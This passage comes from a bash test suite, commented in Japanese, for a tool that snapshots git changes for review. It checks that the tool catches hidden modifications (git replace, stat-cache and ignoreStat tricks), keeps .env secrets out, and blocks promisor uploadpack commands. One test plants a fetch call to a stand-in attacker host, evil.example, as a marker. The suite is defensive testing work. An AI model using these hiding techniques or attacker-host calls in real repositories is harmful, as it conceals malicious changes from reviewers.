  while [ "$i" -le 6 ]; do
    ok "㉜ stat キャッシュによる隠蔽(隠蔽を再現できない環境のため飛ばす)"
    i=$((i + 1))
  done
else
  ok "㉜ 素の git では隠蔽が成立している(前提)"
  c32_st_before="$(OGIT "$R" status --porcelain=v1 -z | tr '\0' '\n')"
  c32_idx_before="$(sha_file "$R/.git/index")"
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --exclude-glob '.env'
  c32_idx_after="$(sha_file "$R/.git/index")"
  c32_st_after="$(OGIT "$R" status --porcelain=v1 -z | tr '\0' '\n')"
  ckeq "㉜ stat キャッシュ隠蔽でも exit 0" "$RC" 0
  secf "$OUT" "追跡差分(stat)"
  ckt "㉜ stat に src/auth.ts が出る" inf "$SECF" 'src/auth.ts'
  secf "$OUT" "追跡差分"
  ckt "㉜ 本文に EVILMARK の + 行が出る" ing "$SECF" '^+.*EVILMARK'
  ckt "㉜ パッチにも EVILMARK の + 行が出る" ing "$PATCHF" '^+.*EVILMARK'
  ckeq "㉜ .git/index の sha256 が実行前後で一致" "$c32_idx_after" "$c32_idx_before"
  ckeq "㉜ status が実行前後で一致" "$c32_st_after" "$c32_st_before"
fi
# sparse-checkout の定義外で作業ツリーに無い skip-worktree は削除として本文に出ない
base_repo c32sp
mkdir -p "$R/hidden"
printf 'H1\n' >"$R/hidden/h01.txt"
printf 'A1\n' >"$R/a.txt"
GIT "$R" add -A
GIT "$R" commit -q -m sparse
B="$(GIT "$R" rev-parse HEAD)"
GIT "$R" config core.sparseCheckout true
printf '/*\n!/hidden/\n' >"$R/.git/info/sparse-checkout"
rm -rf "$R/hidden"
GIT "$R" update-index --skip-worktree hidden/h01.txt
printf 'A2\n' >"$R/a.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉜ 使い捨て index でも sparse の定義外は削除に出ない: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "㉜ 通常の変更は本文に出る" inf "$SECF" '+A2'
ckf "㉜ 定義外の skip-worktree が削除として本文に出ない" inf "$SECF" 'hidden/h01.txt'

# ── ㉝ 一時ディレクトリがリポジトリ内 ──
base_repo c33
printf 'NEWBODY\n' >"$R/new.txt"
mkdir -p "$R/tmpdir"
reset_out
runenv "TMPDIR=$R/tmpdir" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉝ TMPDIR がリポジトリ内: exit 2" "$RC" 2
ckt "㉝ stderr が ERROR [usage]" inf "$CASE_ERR" 'ERROR [usage]'
ckf "㉝ --out が作られない" test -e "$OUT"

# ── ㉞ 置換参照(git replace)──
base_repo c34
printf 'SAFE\n' >"$R/app.txt"
GIT "$R" add app.txt
GIT "$R" commit -q -m safe
B="$(GIT "$R" rev-parse HEAD)"
BT="$(GIT "$R" rev-parse "$B^{tree}")"
printf 'EVIL\n' >"$R/app.txt"
GIT "$R" add app.txt
GIT "$R" commit -q -m evil
CT="$(GIT "$R" rev-parse 'HEAD^{tree}')"
GIT "$R" replace -f "$BT" "$CT" >/dev/null 2>&1
ckeq "㉞ 置換参照が仕込まれている構成になっている" "$(GIT "$R" for-each-ref --format='%(refname)' refs/replace/ | wc -l | tr -d ' ')" 1
ckeq "㉞ 素の git では基準の差分が消えている(前提)" "$(OGIT "$R" diff --name-only "$B" | wc -l | tr -d ' ')" 0
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉞ 置換参照を無効化して実行: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "㉞ 追跡差分に EVIL の変更が出る" inf "$SECF" '+EVIL'
headf "$OUT"
ckt "㉞ 見出しに置換参照の NOTE" inf "$HDF" '置換参照を無効化して実行'

# ── ㉟ テンプレート名も除外 ──
base_repo c35
mkdir -p "$R/config" "$R/.claude/reviews/x"
printf 'SECRET=realvalue\n' >"$R/.env"
printf 'PLACEHOLDER=1\n' >"$R/.env.example"
printf 'REVIEWSECRET=1\n' >"$R/.claude/reviews/x/.env.example"
GIT "$R" add -f .env.example .claude/reviews/x/.env.example
GIT "$R" commit -q -m templates
B="$(GIT "$R" rev-parse HEAD)"
cp -- "$R/.env" "$R/.env.example"
printf 'REVIEWSECRET=2\n' >"$R/.claude/reviews/x/.env.example"
printf 'SECRET=samplevalue\n' >"$R/config/.env.sample"
printf 'SECRET=localvalue\n' >"$R/.env.local"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" \
  --exclude-glob '.env' --exclude-glob '.env.*' --exclude-glob '.dev.vars'
ckeq "㉟ テンプレート名も除外: exit 0" "$RC" 0
secf "$OUT" "除外(機密)"
ckt "㉟ .env.example が除外(機密)に載る" ing "$SECF" "^\.env\.example${TB}"
ckt "㉟ config/.env.sample が除外(機密)に載る" ing "$SECF" "^config/\.env\.sample${TB}"
ckt "㉟ .env.local が除外(機密)に載る" ing "$SECF" "^\.env\.local${TB}"
secf "$OUT" "除外(既定)"
ckt "㉟ .claude/reviews 配下は除外(既定)に載る" ing "$SECF" "^\.claude/reviews/x/\.env\.example${TB}"
ckf "㉟ 出力全体に実値が出ない" inf "$OUT" 'SECRET=realvalue'
ckf "㉟ 出力全体に sample の値が出ない" inf "$OUT" 'SECRET=samplevalue'
ckf "㉟ 出力全体に local の値が出ない" inf "$OUT" 'SECRET=localvalue'
ckf "㉟ 出力全体に reviews の値が出ない" inf "$OUT" 'REVIEWSECRET=2'
ckf "㉟ パッチに実値が出ない" inf "$PATCHF" 'SECRET=realvalue'
ckf "㉟ パッチに reviews の値が出ない" inf "$PATCHF" 'REVIEWSECRET=2'
secf "$OUT" "追跡差分(stat)"
ckf "㉟ stat に .env.example が出ない" inf "$SECF" '.env.example'
reset_out
run --print-allow-ere --exclude-glob '.env'
ckeq "㉟ --print-allow-ere は受理しない: exit 2" "$RC" 2
ckt "㉟ --print-allow-ere の stderr が ERROR [usage]" inf "$CASE_ERR" 'ERROR [usage]'

TB=$(printf '\t')

# ── ㊱ 実行ビットだけの変更 ──
base_repo c36
printf 'echo hi\n' >"$R/run.sh"
chmod 644 -- "$R/run.sh"
GIT "$R" add run.sh
GIT "$R" commit -q -m run
B="$(GIT "$R" rev-parse HEAD)"
chmod +x -- "$R/run.sh"
GIT "$R" config core.filemode false
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --exclude-glob '.env'
ckeq "㊱ 実行ビットだけの変更: exit 0" "$RC" 0
secf "$OUT" "追跡差分(stat)"
ckt "㊱ stat に run.sh が載る" inf "$SECF" 'run.sh'
secf "$OUT" "追跡差分"
ckt "㊱ 本文に old mode 100644" inf "$SECF" 'old mode 100644'
ckt "㊱ 本文に new mode 100755" inf "$SECF" 'new mode 100755'
ckf "㊱ 本文に hunk が無い" ing "$SECF" '^@@'
ckt "㊱ パッチに old mode 100644" inf "$PATCHF" 'old mode 100644'
ckt "㊱ パッチに new mode 100755" inf "$PATCHF" 'new mode 100755'
headf "$OUT"
ckt "㊱ NOTE 無効化して実行 に core.filemode" ing "$HDF" '^- NOTE: 無効化して実行: .*core\.filemode'

# ── ㊲ 大小文字だけ違う未追跡 ──
base_repo c37
mkdir -p "$R/src"
printf 'const a = 1;\n' >"$R/src/auth.ts"
GIT "$R" add src/auth.ts
GIT "$R" commit -q -m auth
B="$(GIT "$R" rev-parse HEAD)"
printf 'AUTHMARK\n' >"$R/src/Auth.ts"
GIT "$R" config core.ignoreCase true
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㊲ 大小文字だけ違う未追跡: exit 0" "$RC" 0
secf "$OUT" "未追跡ファイル"
ckt "㊲ src/Auth.ts が未追跡として出る" inf "$SECF" '+++ b/src/Auth.ts'
ckt "㊲ src/Auth.ts の内容が出る" inf "$SECF" '+AUTHMARK'
headf "$OUT"
ckt "㊲ NOTE 無効化して実行 に core.ignorecase" ing "$HDF" '^- NOTE: 無効化して実行: .*core\.ignorecase'
reset_out
run --cwd "$R" --precheck
ckeq "㊲ --precheck: exit 0" "$RC" 0
ckt "㊲ --precheck も同じ NOTE を stderr に出す" ing "$CASE_ERR" '^NOTE: 無効化して実行: .*core\.ignorecase'
ln -- "$R/src/auth.ts" "$R/src/AUTH.ts"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㊲ ハードリンクの別表記: exit 0" "$RC" 0
secf "$OUT" "含められなかった未追跡"
ckt "㊲ src/AUTH.ts が別表記(同一 inode)で載る" ing "$SECF" "^src/AUTH\.ts${TB}追跡ファイルの別表記(同一 inode)\$"
secf "$OUT" "未追跡ファイル"
ckf "㊲ src/AUTH.ts の内容は本文に出ない" inf "$SECF" '+++ b/src/AUTH.ts'
headf "$OUT"
ckt "㊲ NOTE に別表記の件数" inf "$HDF" '追跡ファイルの別表記(同一 inode): 1 件'

# ── ㊳ .git という名前のエントリ ──
base_repo c38
mkdir -p "$R/tools/.git" "$R/lib"
printf 'all:\n\tsh tools/.git/post.sh\n' >"$R/Makefile"
GIT "$R" add Makefile
GIT "$R" commit -q -m mk
B="$(GIT "$R" rev-parse HEAD)"
printf 'POSTMARK\n' >"$R/tools/.git/post.sh"
printf 'LIBGITMARK\n' >"$R/lib/.git"
git -c init.defaultBranch=main init -q -- "$R/nest"
printf 'NESTMARK\n' >"$R/nest/n.txt"
# ネスト repo を 2 個置く(連想配列のキー展開が 2 件以上で壊れないこと)
git -c init.defaultBranch=main init -q -- "$R/nest2"
printf 'NESTMARK2\n' >"$R/nest2/n.txt"
for pass in 1 2; do
  if [ "$pass" = 2 ]; then
    mkdir -p "$R/.git/info"
    printf '.git\ntools/\n' >"$R/.git/info/exclude"
  fi
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
  ckeq "㊳(pass $pass) .git 名エントリ: exit 0" "$RC" 0
  secf "$OUT" "含められなかった未追跡"
  ckt "㊳(pass $pass) tools/.git/ が載る" ing "$SECF" "^tools/\.git/${TB}\.git という名前のエントリ\$"
  ckt "㊳(pass $pass) lib/.git が載る" ing "$SECF" "^lib/\.git${TB}\.git という名前のエントリ\$"
  ckt "㊳(pass $pass) 有効なネスト repo は従来どおり" ing "$SECF" "^nest/${TB}ネスト repo\$"
  ckt "㊳(pass $pass) ネスト repo が 2 個でも両方載る" ing "$SECF" "^nest2/${TB}ネスト repo\$"
  headf "$OUT"
  ckt "㊳(pass $pass) NOTE は 2 件" inf "$HDF" '`.git` という名前のエントリ: 2 件'
  ckf "㊳(pass $pass) post.sh の内容が出ない" inf "$OUT" 'POSTMARK'
  ckf "㊳(pass $pass) lib/.git の内容が出ない" inf "$OUT" 'LIBGITMARK'
  ckf "㊳(pass $pass) post.sh の名前が本文に出ない" inf "$OUT" 'tools/.git/post.sh'
done

TB=$(printf '\t')

# ── ㊴ diff.context=0 ──
base_repo c39
printf 'l1\nl2\nl3\nl4\nl5\nl6\nl7\nl8\n' >"$R/f.txt"
GIT "$R" add f.txt
GIT "$R" commit -q -m ctx
B="$(GIT "$R" rev-parse HEAD)"
printf 'l1\nl2\nl3\nCHANGED\nl5\nl6\nl7\nl8\n' >"$R/f.txt"
GIT "$R" config diff.context 0
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --exclude-glob '.env'
ckeq "㊴ diff.context=0: exit 0" "$RC" 0
ckt "㊴ パッチの hunk に文脈行がある" ing "$PATCHF" '^ l3$'
ckt "㊴ 変更行がパッチにある" inf "$PATCHF" '+CHANGED'
GIT "$R" worktree add -q --detach "$WORK/at39" HEAD >/dev/null 2>&1
ckt "㊴ 別ツリーで git apply --check が rc 0" \
  env -u GIT_INDEX_FILE "$REAL_GIT" -C "$WORK/at39" apply --check -- "$PATCHF"

# ── ㊵ 大小文字違いの機密名 ──
base_repo c40
printf '.env\n' >"$R/.gitignore"
printf 'SECRET=realvalue\n' >"$R/.env"
printf 'SECRET=capvalue\n' >"$R/.Env"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --exclude-glob '.env'
ckeq "㊵ 大小文字違いの機密名: exit 0" "$RC" 0
secf "$OUT" "除外(機密)"
ckt "㊵ .Env が除外(機密)に載る" ing "$SECF" "^\.Env${TB}"
ckf "㊵ 出力全体に .Env の値が出ない" inf "$OUT" 'SECRET=capvalue'
ckf "㊵ パッチに .Env の値が出ない" inf "$PATCHF" 'SECRET=capvalue'
secf "$OUT" "追跡差分(stat)"
ckf "㊵ stat に .Env が出ない" inf "$SECF" '.Env'

# ── ㊶ 読めないディレクトリ ──
base_repo c41
printf 'all:\n\tsh build/x.sh\n' >"$R/Makefile"
GIT "$R" add Makefile
GIT "$R" commit -q -m mk
B="$(GIT "$R" rev-parse HEAD)"
mkdir -p "$R/build"
printf 'BUILDMARK\n' >"$R/build/x.sh"
if [ "$IS_ROOT" -eq 1 ]; then
  ok "㊶ 読めないディレクトリ: exit 21(root のため飛ばす)"
  ok "㊶ --out は生成される(root のため飛ばす)"
  ok "㊶ build/ が理由「読めない」で載る(root のため飛ばす)"
  ok "㊶ 本文に x.sh の名前が出ない(root のため飛ばす)"
  ok "㊶ 本文に x.sh の内容が出ない(root のため飛ばす)"
else
  chmod 111 -- "$R/build"
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
  ckeq "㊶ 読めないディレクトリ: exit 21" "$RC" 21
  ckt "㊶ --out は生成される" test -f "$OUT"
  secf "$OUT" "含められなかった未追跡"
  ckt "㊶ build/ が理由「読めない」で載る" ing "$SECF" "^build/${TB}読めない\$"
  ckf "㊶ 本文に x.sh の名前が出ない" inf "$OUT" 'build/x.sh'
  ckf "㊶ 本文に x.sh の内容が出ない" inf "$OUT" 'BUILDMARK'
  chmod 755 -- "$R/build"
fi

# ── ㊶ 追跡ファイルが読めない変種(限界の固定)──
# 使い捨ての index には stat が無いので git が全追跡ファイルの内容を読む。読めない追跡ファイルが
# あると git 自身が rc 128 で失敗し、snapshot を作れないまま exit 20 になる(fail-closed)
base_repo c41b
printf 'orig\n' >"$R/locked.txt"
GIT "$R" add locked.txt
GIT "$R" commit -q -m locked
B="$(GIT "$R" rev-parse HEAD)"
if [ "$IS_ROOT" -eq 1 ]; then
  ok "㊶ 読めない追跡ファイル(内容も変更): exit 20(root のため飛ばす)"
  ok "㊶ 読めない追跡ファイルでは --out が作られない(root のため飛ばす)"
  ok "㊶ stderr に ERROR [internal](root のため飛ばす)"
  ok "㊶ 内容を変えずに chmod 000 だけでも exit 20(root のため飛ばす)"
  ok "㊶ 内容を変えない場合も --out が作られない(root のため飛ばす)"
  ok "㊶ chmod を戻せる(root のため飛ばす)"
else
  printf 'CHANGEDBODY\n' >"$R/locked.txt"
  chmod 000 -- "$R/locked.txt"
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
  ckeq "㊶ 読めない追跡ファイル(内容も変更): exit 20" "$RC" 20
  ckf "㊶ 読めない追跡ファイルでは --out が作られない" test -e "$OUT"
  ckt "㊶ stderr に ERROR [internal]" inf "$CASE_ERR" 'ERROR [internal]'
  chmod 644 -- "$R/locked.txt"
  # 内容を変えずに chmod 000 だけでも同じ(使い捨て index では git が内容を読むため)
  GIT "$R" checkout -q -- locked.txt
  chmod 000 -- "$R/locked.txt"
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
  ckeq "㊶ 内容を変えずに chmod 000 だけでも exit 20" "$RC" 20
  ckf "㊶ 内容を変えない場合も --out が作られない" test -e "$OUT"
  chmod 644 -- "$R/locked.txt"
  ckt "㊶ chmod を戻せる" test -r "$R/locked.txt"
fi

# ── ㊷ symlink を同じ文字列の通常ファイルへ置換 ──
base_repo c42
printf 'TARGETBODY\n' >"$R/target.txt"
ln -s target.txt "$R/link"
GIT "$R" add target.txt link
GIT "$R" commit -q -m lnk
B="$(GIT "$R" rev-parse HEAD)"
rm -f -- "$R/link"
printf 'target.txt' >"$R/link"
GIT "$R" config core.symlinks false
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --exclude-glob '.env'
ckeq "㊷ symlink → 同じ文字列の通常ファイル: exit 0" "$RC" 0
secf "$OUT" "追跡差分(stat)"
ckt "㊷ stat に link が載る" inf "$SECF" 'link'
secf "$OUT" "追跡差分"
ckt "㊷ 本文に deleted file mode 120000" inf "$SECF" 'deleted file mode 120000'
ckt "㊷ 本文に new file mode 100644" inf "$SECF" 'new file mode 100644'
ckt "㊷ パッチに deleted file mode 120000" inf "$PATCHF" 'deleted file mode 120000'
ckt "㊷ パッチに new file mode 100644" inf "$PATCHF" 'new file mode 100644'
headf "$OUT"
ckt "㊷ NOTE 無効化して実行 に core.symlinks" ing "$HDF" '^- NOTE: 無効化して実行: .*core\.symlinks'

TB=$(printf '\t')

# ── ㊸ `-` という名前のパス ──
# 未追跡の一覧は `-` が先頭に並ぶので、`-` を引数に取るコマンドが一覧(stdin)を飲み込むと
# 後続の未追跡が黙って snapshot から消える。スクリプトの stdin は /dev/null にし、
# 退行した実装でも待ち続けないよう外側 timeout で守る
base_repo c43
printf 'DASHBODY\n' >"$R/-"
printf 'Z1BODY\n' >"$R/z1.txt"
printf 'Z2BODY\n' >"$R/z2.txt"
reset_out
grun --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㊸ 未追跡の - がある: 待機せず exit 21" "$RC" 21
secf "$OUT" "含められなかった未追跡"
ckt "㊸ - が理由「diff 失敗」で載る" ing "$SECF" "^-${TB}diff 失敗\$"
secf "$OUT" "未追跡ファイル"
ckt "㊸ 後続の z1.txt が本文に出る" inf "$SECF" '+++ b/z1.txt'
ckt "㊸ 後続の z2.txt が本文に出る" inf "$SECF" '+++ b/z2.txt'
ckt "㊸ z1.txt の内容行が出る" inf "$SECF" '+Z1BODY'
ckt "㊸ z2.txt の内容行が出る" inf "$SECF" '+Z2BODY'
ckf "㊸ stdin の内容が - の本文として載らない" inf "$SECF" '+++ b/-'
ckt "㊸ 要約行が 未追跡 3 件(本文 2 / 含められず 1)" inf "$OUT" \
  '要約: 未追跡 3 件(本文 2 / 除外(機密) 0 / 除外(既定) 0 / 対象外 0 / 省略 0 / 含められず 1)'

# ── ㊸ サブディレクトリの `src/-` は通常どおり本文に出る ──
base_repo c43s
mkdir -p "$R/src"
printf 'SUBDASH\n' >"$R/src/-"
reset_out
grun --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㊸ src/- だけなら exit 0" "$RC" 0
secf "$OUT" "未追跡ファイル"
ckt "㊸ src/- のパスが出る" inf "$SECF" '+++ b/src/-'
ckt "㊸ src/- の内容行が出る" inf "$SECF" '+SUBDASH'

# ── ㊸ NUL 入りの変種(変異 (aa) の必須 FAIL の根拠)──
base_repo c43n
printf 'aaa\000NULDASH\n' >"$R/-"
reset_out
grun --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㊸ NUL 入りの未追跡 -: 待機せず exit 0" "$RC" 0
secf "$OUT" "内容を省略した未追跡"
ckt "㊸ NUL 入りの - が理由「バイナリ」で載る" ing "$SECF" "^-${TB}バイナリ\$"
secf "$OUT" "含められなかった未追跡"
ckf "㊸ NUL 入りの - は diff 失敗にならない" ing "$SECF" "^-${TB}diff 失敗\$"
ckf "㊸ 生バイトが出力に出ない" inf "$OUT" 'NULDASH'

# ── ㊸ 追跡の変種 ──
for kind in text nul; do
  base_repo "c43t_$kind"
  printf 'DASHORIG\n' >"$R/-"
  GIT "$R" add -A
  GIT "$R" commit -q -m dash
  B="$(GIT "$R" rev-parse HEAD)"
  if [ "$kind" = text ]; then
    printf 'DASHCHANGED\n' >"$R/-"
  else
    printf 'aaa\000NULTRACKED\n' >"$R/-"
  fi
  reset_out
  grun --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
  ckeq "㊸ 追跡 - の変更($kind): 待機せず exit 0" "$RC" 0
  if [ "$kind" = text ]; then
    secf "$OUT" "追跡差分"
    ckt "㊸ 追跡 - のパスが本文に出る" inf "$SECF" '+++ b/-'
    ckt "㊸ 追跡 - の内容行が本文に出る" inf "$SECF" '+DASHCHANGED'
  else
    secf "$OUT" "内容を省略した追跡"
    ckt "㊸ NUL 入りの追跡 - が理由「バイナリ」で載る" ing "$SECF" "^-${TB}バイナリ\$"
    ckf "㊸ NUL 入りの追跡 - の生バイトが本文に出ない" inf "$OUT" 'NULTRACKED'
  fi
done

# ── ㊸ stdin が開いたままのパイプでも待たない ──
base_repo c43p
printf 'DASHORIG\n' >"$R/-"
GIT "$R" add -A
GIT "$R" commit -q -m dash
B="$(GIT "$R" rev-parse HEAD)"
printf 'DASHCHANGED\n' >"$R/-"
FIFO43="$WORK/stdin43"
rm -f "$FIFO43"
mkfifo "$FIFO43"
( exec 7>"$FIFO43"; sleep 25 ) >/dev/null 2>&1 &
W43=$!
reset_out
grun_in "$FIFO43" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
kill "$W43" 2>/dev/null || true
wait "$W43" 2>/dev/null || true
rm -f "$FIFO43"
ckeq "㊸ stdin が開いたパイプでも待たず exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "㊸ パイプ構成でも追跡 - の変更が本文に出る" inf "$SECF" '+DASHCHANGED'

# ── ㊸ 対象外節の変種(stdin に別の内容を流してもファイルの実内容から計算する)──
base_repo c43c
printf 'OUTBODY\n' >"$R/-"
printf 'STDINDECOY\n' >"$WORK/decoy43"
PRE43="$WORK/pre43"
mklist "$PRE43" -
PRE43SHA="$(sha_file "$PRE43")"
reset_out
grun_in "$WORK/decoy43" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' \
    --pre-untracked "$PRE43" --pre-untracked-sha256 "$PRE43SHA"
ckeq "㊸ 対象外の -: 待機せず exit 0" "$RC" 0
secf "$OUT" "基準時点から存在(対象外)"
ckt "㊸ 対象外節の - がファイルの実内容の sha256・バイト数で載る" \
  ing "$SECF" "^-${TB}通常ファイル${TB}$(sha_str 'OUTBODY
')${TB}8\$"
ckne "㊸ stdin の内容のハッシュになっていない" "$(sha_str 'OUTBODY
')" "$(sha_str 'STDINDECOY
')"

TB=$(printf '\t')

# ── ㊹ core.ignoreStat と core.splitIndex ──
# core.ignoreStat=true のままだと update-index が全エントリに assume-unchanged を付け、
# 使い捨ての index が作業ツリーを読まなくなって追跡差分が丸ごと消える
base_repo c44
printf 'const a = 1;\n' >"$R/app.ts"
GIT "$R" add app.ts
GIT "$R" commit -q -m app
B="$(GIT "$R" rev-parse HEAD)"
printf 'fetch("http://evil.example/x")\n' >>"$R/app.ts"
GIT "$R" config core.ignoreStat true
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --exclude-glob '.env'
ckeq "㊹ core.ignoreStat=true: exit 0" "$RC" 0
secf "$OUT" "追跡差分(stat)"
ckt "㊹ stat に app.ts が出る" inf "$SECF" 'app.ts'
secf "$OUT" "追跡差分"
ckt "㊹ 本文に実内容の + 行が出る" ing "$SECF" '^+.*evil\.example'
ckt "㊹ パッチにも実内容が出る" inf "$PATCHF" 'evil.example'
headf "$OUT"
ckt "㊹ NOTE 無効化して実行 に core.ignorestat" ing "$HDF" '^- NOTE: 無効化して実行: .*core\.ignorestat'
reset_out
run --cwd "$R" --precheck
ckeq "㊹ --precheck: exit 0" "$RC" 0
ckt "㊹ --precheck も同じ NOTE を stderr に出す" ing "$CASE_ERR" '^NOTE: 無効化して実行: .*core\.ignorestat'

# ── ㊹ core.splitIndex=true でユーザーの .git/ にファイルを増やさない ──
base_repo c44b
printf 'const a = 1;\n' >"$R/app.ts"
GIT "$R" add app.ts
GIT "$R" commit -q -m app
B="$(GIT "$R" rev-parse HEAD)"
printf 'CHANGED44\n' >>"$R/app.ts"
GIT "$R" config core.splitIndex true
LS44A="$(ls -A "$R/.git" | LC_ALL=C sort | tr '\n' ' ')"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
LS44B="$(ls -A "$R/.git" | LC_ALL=C sort | tr '\n' ' ')"
ckeq "㊹ core.splitIndex=true: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "㊹ splitIndex 構成でも本文に差分が出る" inf "$SECF" '+CHANGED44'
ckeq "㊹ 実行前後で .git/ のエントリ一覧が不変" "$LS44B" "$LS44A"
headf "$OUT"
ckf "㊹ NOTE 無効化して実行 に core.splitindex は載らない" ing "$HDF" 'core\.splitindex'
ckf "㊹ .git/ に sharedindex が作られない" test -n "$(find "$R/.git" -maxdepth 1 -name 'sharedindex.*' -print -quit)"

TB=$(printf '\t')
# ㊺ はすべて外側 timeout 30 で守る
run45() { RC=0; guard_t 30 bash "$TARGET" "$@" </dev/null >"$CASE_OUT" 2>"$CASE_ERR" || RC=$?; }
runp45() { local d="$1"; shift; RC=0; guard_t 30 env PATH="$d:$PATH" bash "$TARGET" "$@" </dev/null >"$CASE_OUT" 2>"$CASE_ERR" || RC=$?; }

# ── ㊺ promisor remote の遅延取得 ──
# 基準側の blob を消すと、git は promisor remote から取りに行き `remote.<名>.uploadpack` の
# コマンドを起動する。遅延取得を無効化していないと、それだけで任意コマンドが走る
UP45="$STUBS/uploadpack45.sh"
cat >"$UP45" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "uploadpack $*" >>"$SELFTEST_TRACE"
exit 1
EOF
chmod +x "$UP45"
mk_promisor_repo() { # $1=名前 ($2=drop なら基準側 blob を消す)
  base_repo "$1"
  printf 'BASEBODY\n' >"$R/f.txt"
  GIT "$R" add f.txt
  GIT "$R" commit -q -m base
  B="$(GIT "$R" rev-parse HEAD)"
  printf 'CHANGED45\n' >"$R/f.txt"
  GIT "$R" config core.repositoryformatversion 1
  GIT "$R" config extensions.partialClone origin
  GIT "$R" config remote.origin.promisor true
  GIT "$R" config remote.origin.url "$WORK/nosuchremote45"
  GIT "$R" config remote.origin.uploadpack "sh $UP45"
  if [ "${2:-}" = drop ]; then
    BLOB45="$(GIT "$R" rev-parse "$B:f.txt")"
    rm -f "$R/.git/objects/${BLOB45:0:2}/${BLOB45:2}"
  fi
}

export SELFTEST_TRACE="$WORK/tr45"
mk_promisor_repo c45 drop
# 遅延取得を止めなければ uploadpack が走る構成であることを確かめる(アサーションが空振りしないため)
: >"$SELFTEST_TRACE"
( unset GIT_NO_LAZY_FETCH; OGIT "$R" diff --name-only "$B" >/dev/null 2>&1 ) || true
ckne "㊺ 遅延取得を止めなければ uploadpack が走る構成になっている" \
  "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
: >"$SELFTEST_TRACE"
reset_out
run45 --cwd "$R" --precheck
ckeq "㊺ promisor 構成の --precheck: exit 0" "$RC" 0
ckt "㊺ --precheck の stderr に promisor の NOTE" inf "$CASE_ERR" 'NOTE: promisor 構成: 遅延取得を無効化して実行'
ckeq "㊺ --precheck で uploadpack が起動されない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
: >"$SELFTEST_TRACE"
reset_out
run45 --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㊺ 基準側 blob 欠落の通常実行: exit 20" "$RC" 20
ckeq "㊺ 通常実行でも uploadpack が起動されない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
ckf "㊺ 基準側 blob を読めないので --out は作られない" test -e "$OUT"

# blob を消さない構成では通常どおり生成され、見出しに NOTE が出る
mk_promisor_repo c45b
: >"$SELFTEST_TRACE"
reset_out
run45 --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㊺ blob が揃った promisor 構成: exit 0" "$RC" 0
headf "$OUT"
ckt "㊺ 見出しに promisor の NOTE" inf "$HDF" 'NOTE: promisor 構成: 遅延取得を無効化して実行'
ckt "㊺ NOTE に該当キーが載る" inf "$HDF" 'extensions.partialclone'
secf "$OUT" "追跡差分"
ckt "㊺ 本文は通常どおり生成される" inf "$SECF" '+CHANGED45'
ckeq "㊺ 通常生成でも uploadpack が起動されない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0

# ── ㊺ git 2.45 未満(GIT_NO_LAZY_FETCH が効かない版)→ exit 22・承認の対象外 ──
GSTUB45="$WORK/gitstub45"
mkdir -p "$GSTUB45"
# version にだけ 2.34.1 を返し、他は GIT_NO_LAZY_FETCH を環境から外して本物へ委譲する
# (外さないと本物の git 2.55 が遅延取得を止めてしまい、検査の順序の誤りを検出できない)
cat >"$GSTUB45/git" <<EOF
#!/usr/bin/env bash
printf '%s\n' "\$*" >>"\${SELFTEST_GITLOG:-/dev/null}"
skip=0
for a in "\$@"; do
  if [ "\$skip" = 1 ]; then skip=0; continue; fi
  case "\$a" in
    -c) skip=1; continue ;;
    -*) continue ;;
    version) echo "git version 2.34.1"; exit 0 ;;
    *) break ;;
  esac
done
exec env -u GIT_NO_LAZY_FETCH "$REAL_GIT" "\$@"
EOF
chmod +x "$GSTUB45/git"
mk_promisor_repo c45c drop
: >"$SELFTEST_TRACE"
reset_out
runp45 "$GSTUB45" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㊺ git 2.45 未満 + promisor: exit 22" "$RC" 22
ckt "㊺ extensions.partialclone が ローカル設定: で stderr に出る(3 列目は設定値の sha256)" \
  ing "$CASE_ERR" "^extensions\.partialclone${TB}ローカル設定: extensions\.partialclone${TB}$(sha_str 'origin')${TB}origin\$"
ckt "㊺ remote.origin.promisor も ローカル設定: で stderr に出る(3 列目は設定値の sha256)" \
  ing "$CASE_ERR" "^remote\.origin\.promisor${TB}ローカル設定: remote\.origin\.promisor${TB}$(sha_str 'true')${TB}true\$"
